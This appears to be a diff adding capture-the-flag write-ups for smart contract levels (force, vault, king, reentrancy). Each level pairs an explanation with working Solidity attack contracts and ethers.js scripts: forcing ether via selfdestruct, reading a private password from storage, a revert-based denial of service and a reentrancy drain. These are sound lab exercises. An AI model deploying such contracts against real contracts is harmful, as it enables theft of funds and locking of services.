@@ -114,4 +114,125 @@ await tx.wait();
 ```
 ---
 
+## force
+
+Goal is to force some ether in the contract. As you can see the contract has no `receive` implmeneted, we can not send the ether directly. Here comes the interesting part, to send eth to a contract adress there are three ways
+- constructor while deploying the contract
+- send via transfer or call if receive is implemented
+- selfdestruct another contract with the beneficiary as the contract you'd like to force
+
+`selfdestruct` doesn't check if the receive is implemented or not. Contract will have to accept the ether. We'll use this one
+
+Deploy a new contract and destruct it with the beneficiary as the instance address
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract ForceHack {
+    constructor() payable {}
+    function destruct(address payable forceAddress) public {
+        selfdestruct(forceAddress);
+    }
+}
+```
+
+in the javascript
+
+```javascript
+const force = Force.attach(INSTANCE_ADDRESS);
+const forceHack = await ForceHack.deploy({ value: 1 });
+await forceHack.deployed()
+console.log(await ethers.provider.getBalance(forceHack.address));
+
+const tx = await forceHack.destruct(force.address);
+await tx.wait();
+console.log(await ethers.provider.getBalance(force.address));
+```
+
+---
+
+## vault
+
+`private` keyword only restricts visibility of a variable from other smart contracts not from the external world. Blockchain data is public be it public, private or constant. To unlock the vault we need to access the the storage slot which stores password
+
+1st slot will have bool locked (slot id 0x0)
+
+2nd slot is the password (slot id 0x1)
+
+```javascript
+const storage = await ethers.provider.getStorageAt(vault.address, "0x1", "latest");
+const tx = await vault.unlock(storage);
+```
+
+---
+
+## king
+
+Things to notice here
+- external call using `transfer` in `receive` doesn't check the return response.
+- to become the king you need to send some eth to this contract
+- next user sending eth to this contract will trigger a transfer to the existing king
+
+Since there is no response check or try / catch in the external call. It can be blocked by reverting everytime and render the contract unusable. This is called Denial of Service attack.
+
+To clear this level. We need to implement a new contract (KingAttack contract) and send some ether to King contract from the KingAttack contract which will make the KingAttack new king. 
+
+KingAttack should revert on receive to make the King contract unusable
+
+```solidity
+contract KingAttack {
+    function sendPayment(address king) external payable {
+        (bool success, ) = payable(address(king)).call{value: msg.value}("");
+        require(success, "External call success");
+    }
+    receive () external payable {
+        require(!true, "Ha Ha Ha");
+    }
+}
+```
+
+```javascript
+const tx = await kingAttack.sendPayment(king.address, {value: hre.ethers.utils.parseEther("0.002")});
+```
+0.002 because the value should be more than or equals current prize
+
+
+---
+
+## reentrancy
+
+As the name states this is a simple reentrancy problem. 
+
+[What is a Reentrancy Attack by Certik](https://www.certik.com/resources/blog/3K7ZUAKpOr1GW75J2i0VHh-what-is-a-reentracy-attack)
+
+In this challenge, `(bool result,) = msg.sender.call{value:_amount}("");` allows the receiver to reenter using receive fallback. As you can see the balances are updated after the call, we can trigger the withdraw again
+
+```solidity
+contract ReentranceHack {
+    address public instanceAddress;
+    constructor(address instance) {
+        instanceAddress = instance;
+    }
+    function withdraw() public {
+        IReentrance(instanceAddress).withdraw(0.0005 ether);
+    }
+    receive() external payable {
+        IReentrance(instanceAddress).withdraw(0.0005 ether);
+    }
+}
+```
+
+```javascript
+tx = await reentrance.donate(reentranceHack.address, {value: hre.ethers.utils.parseEther("0.0005")})
+await tx.wait();
+
+tx = await reentranceHack.withdraw();
+await tx.wait();
+
+console.log(await ethers.provider.getBalance(reentrance.address));
+```
+
+---
+
+
 
